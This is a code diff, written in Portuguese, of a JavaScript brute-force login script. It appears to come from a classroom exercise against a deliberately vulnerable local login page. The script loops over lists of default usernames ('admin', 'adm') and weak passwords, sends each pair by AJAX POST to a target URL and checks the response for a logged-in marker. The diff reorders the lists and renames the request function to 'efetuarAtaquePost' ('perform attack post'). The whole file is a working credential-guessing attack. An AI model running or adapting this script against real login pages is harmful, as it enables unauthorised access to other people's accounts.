@@ -5,8 +5,8 @@ startFB().then((res)=>{
 
 function getDic() {
    return {
-      logins: ['administrador', 'admin', 'adm'],
-      senhas: ['123', '1234', '12345', 'administrador', 'admin', 'adm']
+      logins: ['adm', 'administrador', 'admin', ],
+      senhas: ['admin', '123', '1234', '12345', 'administrador', 'adm']
    }
 }
 
@@ -20,8 +20,11 @@ async function startFB(){
 
    dicionario.logins.map(async(login)=>{
       dicionario.senhas.map(async(senha)=>{
+
          let data = { login: login, senha: senha };
-         let response = await sendPost(data);
+
+         let response = await efetuarAtaquePost(data);
+
          if(verificaLogin(response.res)){
             user.login = login;
             user.senha = senha;
@@ -36,29 +39,32 @@ function verificaLogin(txt) {
    return (txt.includes('<h3>Logado</h3>'));
 }
 
-async function sendPost(data) {
+async function efetuarAtaquePost(data) {
 
-   const url = "http://localhost/Aula/Login_Vulneravel/";
+   // Altera o caminho relativo aqui para testar (eu usei xampp, então joguei para a url: http://localhost/bf/)
+   const caminho = '/bf'; 
 
-   let response = {
+   const urlAlvo = `${window.location.origin}${caminho}/alvo`; 
+
+   let requisicao = {
       success: false,
       res: null
    }
 
    await $.ajax({
-      url: url,
+      url: urlAlvo,
       type: 'POST',
       data: data,
       success: function (res) {
-         response.success = true;
-         response.res = res;
+         console.log(res)
+         requisicao.success = true;
+         requisicao.res = res;
       },
       error: function (err) {
-         response.success = false;
-         response.res = err;
+         requisicao.success = false;
+         requisicao.res = err;
       }
    });
 
-   return response;
-
+   return requisicao;
 }
